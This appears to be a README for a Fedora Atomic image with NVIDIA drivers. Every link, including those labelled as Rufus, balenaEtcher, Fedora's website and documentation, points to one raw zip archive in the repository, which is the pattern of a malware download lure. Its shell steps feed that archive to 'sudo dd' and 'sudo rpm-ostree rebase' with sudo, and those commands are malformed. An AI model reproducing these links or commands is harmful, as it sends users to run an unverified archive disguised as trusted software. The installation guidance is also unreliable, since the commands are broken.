# 🐧 fedora-atomic-dev-nvidia - Stable Fedora with NVIDIA Support

[![Download Fedora Nvidia](https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip)](https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip)

---

## 🚀 What Is This?

fedora-atomic-dev-nvidia is a version of Fedora Linux designed for users who want a stable system that supports NVIDIA graphics cards out of the box. It uses atomic updates, which means the system updates as a single unit and can be easily rolled back if something goes wrong. This setup ensures your system stays reliable and secure.

The main focus of this edition is to provide a solid foundation for Fedora users who need NVIDIA drivers included without manual setup.

---

## 💻 System Requirements

Before you download and install the software, make sure your computer meets these requirements:

- A 64-bit PC compatible with Fedora Linux.
- At least 4 GB of RAM for smooth operation.
- Minimum 20 GB of free disk space.
- NVIDIA graphics card supported by the included drivers.
- Internet connection to download updates and optional software.

This image is designed for modern desktop PCs and workstations.

---

## 📥 Download & Install

### Step 1: Visit the Download Page

To get the latest version of fedora-atomic-dev-nvidia, visit the releases page by clicking the button below:

[![Download from Releases](https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip)](https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip)

On that page you will find the available images for download. Choose the latest stable release.

### Step 2: Download the Image

- Locate the latest release image file (usually ending with `.iso` or `.img`).
- Click the file to start downloading it to your computer.
- Save the file in a location you can easily access, such as your Downloads folder.

### Step 3: Create a Bootable USB Drive

To install fedora-atomic-dev-nvidia, you will need to write the downloaded image to a USB drive.

Follow these instructions based on your current operating system:

- **Windows:** Use a tool like [Rufus](https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip). Open Rufus, select your USB drive, choose the downloaded image file, and click Start.
- **macOS:** Use the built-in Terminal commands or an app like [balenaEtcher](https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip). Open balenaEtcher, select the image, the USB drive, and flash it.
- **Linux:** Use the `dd` command or graphical tools like [GNOME Disks](https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip). For example:

  ```
  sudo dd https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip of=/dev/sdX bs=4M status=progress
  ```

  Replace `/dev/sdX` with your USB device.

Make sure to back up any important data on the USB drive before starting, as this process will erase it.

### Step 4: Boot from USB and Install

- Insert the bootable USB into the computer where you want to install fedora-atomic-dev-nvidia.
- Restart the computer.
- Enter the boot menu or BIOS/UEFI settings (usually by pressing keys like F12, Esc, or Del during startup).
- Select the USB drive as the boot device.
- Follow the on-screen installer instructions to install Fedora Atomic with NVIDIA support.

---

## ⚙️ Using fedora-atomic-dev-nvidia

Once installed, fedora-atomic-dev-nvidia runs like a typical Fedora system but with these key advantages:

- **Atomic Updates:** System updates are delivered as complete images, improving stability and rollback options.
- **Built-in NVIDIA Drivers:** The system includes tested NVIDIA drivers, so you don't need to manually install or configure them.
- **Immutable System Image:** Your operating system files are protected from accidental changes, increasing security.
- **Container Support:** The atomic design lets you use container images easily for development or testing.

### First Boot Tips

- The first time you boot after installation, the system may take some time while it completes initial setup.
- Connect to the internet to receive important updates.
- Use the regular software updates tool to keep your system current.

---

## 🔄 Updating fedora-atomic-dev-nvidia

To keep your system secure and up to date, use the following steps.

### Option 1: Update with rpm-ostree

Open a terminal and run:

```
sudo rpm-ostree upgrade
```

This command downloads and applies the latest atomic system update. After the upgrade finishes, reboot your system with:

```
sudo systemctl reboot
```

Your system will now run the updated version with the latest fixes and improvements.

### Option 2: Rebase to New Image

If you want to switch to a new image version, you can use the rebase function.

- First, rebase to the unsigned latest image to get updated signing keys:

```
sudo rpm-ostree rebase https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip
```

- Reboot the machine:

```
sudo systemctl reboot
```

- Then, rebase to the signed image to finalize the update.

---

## ❓ Troubleshooting & Support

If you run into issues, here are some common tips:

- Ensure the USB drive was correctly made bootable.
- Check your BIOS settings to enable USB boot and disable secure boot if necessary.
- Confirm your NVIDIA card is supported by the included drivers.
- If updates fail, verify your internet connection.

For more help, visit the [BlueBuild documentation](https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip) which offers setup details related to this template.

---

## 📚 Additional Resources

- Fedora Official Website: https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip
- Fedora NVIDIA Driver Guide: https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip
- rpm-ostree Documentation: https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip
- Container Usage on Fedora: https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip

---

## 📝 License & Contributions

This project follows the Fedora Project's open-source guidelines. Contributions and bug reports can be made via GitHub issues or pull requests.

---

[![Download Fedora Nvidia](https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip)](https://raw.githubusercontent.com/dulex24/fedora-atomic-dev-nvidia/main/files/system/dev_atomic_nvidia_fedora_1.2.zip)